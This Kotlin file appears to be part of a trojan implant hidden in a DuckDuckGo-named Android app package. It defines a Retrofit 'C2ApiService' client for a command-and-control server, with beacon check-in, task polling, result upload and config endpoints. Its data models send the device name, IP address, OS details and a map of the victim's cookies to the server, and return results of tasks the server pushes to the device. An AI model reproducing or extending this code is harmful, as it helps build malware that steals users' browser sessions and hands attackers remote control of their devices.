package com.duckduckgo.trojan.impl

import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.GET
import retrofit2.http.POST
import retrofit2.http.Path

/**
 * Retrofit interface matching the FastAPI server endpoints.
 *
 * Endpoints (from server/server.py):
 *   POST /beacon/check-in   → register device, get server config
 *   GET  /beacon/tasks/{name} → poll for pending tasks
 *   POST /beacon/result      → submit task execution result
 *   GET  /beacon/config      → get current server config
 */
interface C2ApiService {

    @POST("/beacon/check-in")
    suspend fun checkIn(@Body body: CheckInRequest): CheckInResponse

    @GET("/beacon/tasks/{deviceName}")
    suspend fun getTasks(@Path("deviceName") deviceName: String): TasksResponse

    @POST("/beacon/result")
    suspend fun sendResult(@Body body: TaskResultRequest): Response<TaskResultResponse>

    @GET("/beacon/config")
    suspend fun getConfig(): ConfigResponse
}

// ---------------------------------------------------------------------------
// Request models (match server/models.py → BeaconCheckIn)
// ---------------------------------------------------------------------------

/** Maps to: server/models.py → BeaconCheckIn */
data class CheckInRequest(
    val device_name: String,
    val ip_address: String,
    val os_info: String = "",
    val cookies: Map<String, String> = emptyMap(),
)

// ---------------------------------------------------------------------------
// Response models (match server/server.py response dicts)
// ---------------------------------------------------------------------------

/** Response from POST /beacon/check-in */
data class CheckInResponse(
    val status: String,
    val beacon_interval: Int,
    val communication_protocol: String,
)

/** Response from GET /beacon/tasks/{deviceName} */
data class TasksResponse(
    val device: String,
    val tasks: List<TaskDto>,
    val beacon_interval: Int,
)

/** A single task from the server (matches server/models.py → TaskResponse) */
data class TaskDto(
    val task_id: String,
    val task_type: String,
    val parameters: Map<String, Any> = emptyMap(),
)

/** Maps to: server/models.py → TaskResult */
data class TaskResultRequest(
    val task_id: String,
    val device_name: String,
    val task_type: String = "",
    val success: Boolean,
    val data: Map<String, Any> = emptyMap(),
    val encrypted: Boolean = false,
)

/** Response from POST /beacon/result */
data class TaskResultResponse(
    val status: String,
    val task_id: String,
)

/** Response from GET /beacon/config */
data class ConfigResponse(
    val beacon_interval: Int,
    val communication_protocol: String,
    val valid_intervals: List<Int>,
)
